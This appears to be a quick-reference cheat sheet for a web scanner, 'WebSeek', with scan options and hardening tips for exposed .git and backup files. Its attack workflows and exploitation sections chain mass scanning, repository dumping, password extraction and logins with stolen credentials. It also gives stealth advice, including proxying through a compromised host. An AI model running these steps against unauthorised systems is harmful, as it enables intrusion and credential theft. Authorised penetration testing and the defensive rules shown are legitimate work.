# WebSeek Quick Reference

## Quick Start

```bash
# Full vulnerability scan
./webseek.py --full 192.168.1.0/24

# Git exposure only (fast, high-value)
./webseek.py --git -f targets.txt

# Backup file hunting
./webseek.py --backup 10.0.0.0/24

# Information disclosure
./webseek.py --info http://target.com
```

## Common Commands

### Discovery Scans
```bash
# Single target
./webseek.py http://192.168.1.10

# Network range
./webseek.py 10.0.0.0/24 --full

# From file
./webseek.py -f webservers.txt --full

# Specific ports
./webseek.py --ports 80,443,8080 192.168.1.0/24
```

### Focused Scans
```bash
# Critical findings only
./webseek.py --git --backup -f targets.txt

# Info disclosure
./webseek.py --info 192.168.1.0/24

# Security headers
./webseek.py --headers https://target.com

# Common paths enumeration
./webseek.py --paths http://target.com
```

### Performance Tuning
```bash
# Fast scan (50 workers)
./webseek.py -w 50 --full 10.0.0.0/24

# Slow/stealthy (5 workers)
./webseek.py -w 5 --timeout 10 -f targets.txt

# Verbose output
./webseek.py -v --full http://target.com
```

## Output Files

| File | Description |
|------|-------------|
| `weblist.txt` | Vulnerable web servers |
| `findings.txt` | All findings summary |
| `git_repos.txt` | Exposed Git repositories |
| `backup_files.txt` | Backup files found |
| `web_details.txt` | Detailed findings |
| `web_details.json` | JSON export |

## Vulnerability Types

| Type | Severity | Description |
|------|----------|-------------|
| Git Exposure | CRITICAL | Exposed .git directory |
| Backup Files | MEDIUM-HIGH | .bak, .old, ~ files |
| PHPInfo | HIGH | PHP configuration page |
| Directory Listing | MEDIUM | File browsing enabled |
| SQL Errors | MEDIUM | Database info leakage |
| Missing Headers | LOW | Security headers absent |

## Common Patterns

### Git Exposure
```
Checked:
  /.git/
  /.git/config
  /.git/HEAD
  /.git/index

Exploit:
  git-dumper http://target/.git/ output/
```

### Backup Files
```
Checked:
  index.php.bak
  config.php.old
  database.yml~
  backup.zip

Extract:
  wget http://target/config.php.bak
  grep -i "password" config.php.bak
```

### Info Disclosure
```
Checked:
  /phpinfo.php
  /info.php
  /debug.php
  /test.php

Review:
  curl http://target/phpinfo.php | grep "expose"
```

### Common Paths
```
Checked:
  /admin
  /administrator
  /backup
  /config
  /phpmyadmin
  /.env

Test:
  curl -I http://target/admin
```

## Attack Workflows

### Workflow 1: Quick Win Hunt
```bash
# 1. Fast Git scan
./webseek.py --git 192.168.0.0/16 -w 100

# 2. Download repos
for url in $(cat git_repos.txt); do
    git-dumper "$url" "repo_$(echo $url | md5sum | cut -c1-8)"
done

# 3. Extract secrets
grep -r "password\|api.*key" repo_*/
```

### Workflow 2: Backup Bonanza
```bash
# 1. Find backups
./webseek.py --backup -f webservers.txt

# 2. Download all
while read url; do
    wget -q "$url" -P backups/
done < backup_files.txt

# 3. Analyze
grep -r "password\|credential" backups/
```

### Workflow 3: Full Assessment
```bash
# 1. Comprehensive scan
./webseek.py --full 10.0.0.0/24 -w 50

# 2. Review critical findings
grep "CRITICAL\|HIGH" findings.txt

# 3. Exploit high-value targets
cat git_repos.txt backup_files.txt

# 4. Generate report
cat findings.txt > pentest_report_web.txt
```

## Integration Examples

### With Git-Dumper
```bash
# 1. Find Git repos
./webseek.py --git 192.168.1.0/24

# 2. Dump repositories
while read repo; do
    git-dumper "$repo" "output/$(echo $repo | md5sum | cut -c1-8)"
done < git_repos.txt

# 3. Search for secrets
find output/ -type f -exec grep -l "password\|api_key" {} \;
```

### With TruffleHog
```bash
# 1. Download Git repos via WebSeek
./webseek.py --git -f targets.txt

# 2. Extract with git-dumper
git-dumper http://target/.git/ source/

# 3. Hunt secrets with TruffleHog
truffleHog filesystem source/ --json > secrets.json

# 4. Review findings
jq '.[] | select(.verified==true)' secrets.json
```

### With Nuclei
```bash
# 1. Quick WebSeek scan
./webseek.py --full -f targets.txt

# 2. Deep scan with Nuclei
nuclei -l weblist.txt -t exposures/ -t misconfiguration/

# 3. Correlate findings
diff <(sort weblist.txt) <(sort nuclei_output.txt)
```

## Quick Checks

```bash
# Count vulnerable hosts
wc -l weblist.txt

# Count Git repos
wc -l git_repos.txt

# Count backup files
wc -l backup_files.txt

# Extract just URLs
cut -d' ' -f1 weblist.txt

# Filter by severity
grep "CRITICAL" findings.txt
grep "HIGH" findings.txt
```

## Common Options

```
Scan Modes:
  --full                Full scan (all checks)
  --git                 Git exposure only
  --backup              Backup files only
  --info                Info disclosure only
  --headers             Security headers only
  --paths               Common paths only

Targeting:
  IP/URL                Single target
  -f, --file FILE       Targets from file
  --ports PORTS         Ports (default: 80,443,8080,8443,8888,9090)

Performance:
  -w, --workers N       Threads (default: 10)
  --timeout N           Timeout seconds (default: 5)
  
Output:
  -v, --verbose         Detailed output
  --json                JSON only
```

## Detection Indicators

### Web Server Logs
```
# Sequential path scanning
GET /.git/HEAD
GET /.git/config
GET /.git/index
HEAD /index.php.bak
HEAD /config.php.old
```

### Patterns
- Multiple 404 errors from single IP
- Requests to .git directories
- HEAD requests (backup detection)
- Sequential admin path probing
- Python-requests User-Agent

## Defense Quick Tips

### Apache
```apache
# Block Git
RedirectMatch 404 /\.git

# Block backups
<FilesMatch "\.(bak|old|swp)$">
    Deny from all
</FilesMatch>

# Disable listing
Options -Indexes

# Security headers
Header set X-Frame-Options "SAMEORIGIN"
Header set X-Content-Type-Options "nosniff"
```

### Nginx
```nginx
# Block Git
location ~ /\.git { deny all; return 404; }

# Block backups
location ~ \.(bak|old|swp)$ { deny all; }

# Disable listing
autoindex off;

# Security headers
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
```

## Exploitation Quick Steps

### Git Repository
```bash
# 1. Find
./webseek.py --git target.com

# 2. Download
git-dumper http://target/.git/ source/

# 3. Extract creds
cd source && grep -r "password\|api_key"

# 4. Test
./dbseek.py -u found_user -p found_pass target.com
```

### Backup Files
```bash
# 1. Find
./webseek.py --backup target.com

# 2. Download
wget http://target.com/config.php.bak

# 3. Extract
cat config.php.bak | grep -A3 -B3 "password"

# 4. Use
mysql -h target.com -u extracted_user -p
```

### PHPInfo Page
```bash
# 1. Find
./webseek.py --info target.com

# 2. Review
curl http://target.com/phpinfo.php > phpinfo.html

# 3. Check for vulns
grep "allow_url_include\|disable_functions" phpinfo.html

# 4. Exploit
# If allow_url_include=On → RFI vulnerability
```

## Tips & Tricks

### 🎯 Targeting
- **Git first**: Highest value, fastest scan
- **Backups second**: Easy source code access
- **Full scan last**: Most comprehensive but slower
- **Focus on custom apps**: Higher vuln probability

### 🔒 Stealth
- **Fewer workers**: `-w 5` for stealthy scans
- **Longer timeout**: `--timeout 10` to avoid retries
- **Business hours**: Scan when traffic is normal
- **Proxy usage**: Route through compromised host

### ⚡ Speed
- **More workers**: `-w 100` for large networks
- **Skip headers**: Faster without `--headers`
- **Targeted scans**: Use `--git --backup` only
- **Batch processing**: Split into /24 subnets

### 🎓 Learning
- **Practice in lab**: Test on your own servers
- **Read logs**: Understand your footprint
- **Try tools**: git-dumper, GitTools, TruffleHog
- **Study exploits**: Learn from real-world cases

## Severity Guide

| Severity | Description | Action |
|----------|-------------|--------|
| CRITICAL | Git exposure, credentials in plain text | Immediate fix |
| HIGH | PHPInfo, source code disclosure | Fix urgently |
| MEDIUM | Backup files, directory listing | Fix soon |
| LOW | Missing headers | Fix eventually |

## One-Liners

```bash
# Quick Git scan and download
./webseek.py --git 10.0.0.0/24 && cat git_repos.txt | while read url; do git-dumper "$url" "out_$(date +%s)"; done

# Find and download all backups
./webseek.py --backup -f targets.txt && wget -i backup_files.txt -P backups/

# Full scan with JSON export
./webseek.py --full 192.168.1.0/24 --json > results.json

# Extract only critical findings
./webseek.py --full -f targets.txt | grep "CRITICAL\|HIGH"
```

## Troubleshooting

### No Results
```bash
# Increase timeout
./webseek.py --timeout 15

# Try verbose mode
./webseek.py -v --full

# Test connectivity
curl -I http://target.ip
```

### Too Slow
```bash
# More workers
./webseek.py -w 50

# Reduce timeout
./webseek.py --timeout 3

# Skip low-value checks
./webseek.py --git --backup  # Skip headers
```

### False Positives
```bash
# Verify manually
curl -I $(head -1 git_repos.txt)

# Check content
wget $(head -1 backup_files.txt)
file downloaded_file
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success - vulnerabilities found |
| 1 | No vulnerabilities found |
| 2 | Connection errors |
| 3 | No targets specified |

## Quick Reference Card

```
┌──────────────────────────────────────────────────┐
│           WEBSEEK CHEAT SHEET                    │
├──────────────────────────────────────────────────┤
│ HIGH-VALUE SCANS                                 │
│  --git              Find .git exposure           │
│  --backup           Find backup files            │
│  --info             Find info disclosure         │
├──────────────────────────────────────────────────┤
│ OUTPUTS                                          │
│  git_repos.txt      Exposed repositories         │
│  backup_files.txt   Backup files                 │
│  findings.txt       All findings                 │
├──────────────────────────────────────────────────┤
│ EXPLOITATION                                     │
│  git-dumper URL out/     Download Git repo       │
│  wget backup_file        Download backup         │
│  grep -r "password" .    Extract secrets         │
└──────────────────────────────────────────────────┘
```

## Related Commands

```bash
# Git repository download
git-dumper http://target/.git/ output/

# Secret scanning
truffleHog filesystem output/ --json

# Git history search
git log --all --pretty=format:"%H" | while read hash; do
    git show $hash | grep -i "password\|api"
done

# Backup analysis
strings backup.zip | grep -i "password\|credential"

# Security header testing
curl -I https://target.com | grep -E "X-Frame|CSP|HSTS"
```

## Learning Resources

- **OWASP Testing Guide**: Web application security testing
- **PortSwigger Web Security Academy**: Free web security training
- **HackTricks**: Git exposure exploitation techniques
- **GitHub**: git-dumper, GitTools, TruffleHog tools
- **Bug Bounty Reports**: HackerOne, Bugcrowd writeups
